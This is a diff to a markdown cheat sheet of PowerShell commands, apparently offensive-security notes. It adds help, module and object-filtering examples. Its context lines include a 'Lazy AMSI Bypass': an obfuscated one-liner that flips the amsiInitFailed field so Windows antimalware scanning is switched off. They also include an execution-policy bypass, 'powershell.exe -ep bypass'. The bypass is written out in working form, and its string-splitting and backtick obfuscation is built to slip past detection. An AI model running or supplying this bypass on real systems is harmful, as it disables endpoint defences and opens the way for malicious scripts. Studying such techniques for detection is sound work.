@@ -1,6 +1,36 @@
 # Commands
 
 # Powershell Basics
+
+#### Help
+```
+Get-Help Get-Help
+Get-Help *
+Get-Help process
+Get-Help Get-Item -Full
+Get-Help Get-Item -Examples
+```
+#### Modules
+Import-Module modulepath
+Get-Command -Module <modulename>
+
+
+
+#### Filter property string search
+
+```Get-ADUser -Filter * | Where-Object {$_.Name -like '*smith*'}```
+  
+```Get-Service | Where-Object {$_.DisplayName -like '*Windows*'}```
+
+
+
+```Get-Process | Select-Object -Property * | Where-Object { $_.psobject.Properties.Value -like '*chrome*' }```
+
+```Get-Process | Select-Object -Property * | Where-Object { $_.* -like '*chrome*' }```
+
+```Get-ANYTHING  | Select-Object -Property * | Where-Object { $_.* -like '*admin*' }```
+
+# Running Powershell
 #### Lazy AMSI Bypass
 ```
 sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ); ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
@@ -12,6 +42,8 @@ $var1 = 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx'; $var2 = [TYpE]("{1}{0}"-F'F','rE');
 
 #### EP Bypass
 Start PowerShell from cmd.exe:
+
+```Powershell- c <cmd>```
 
 ```powershell.exe -ep bypass```
 
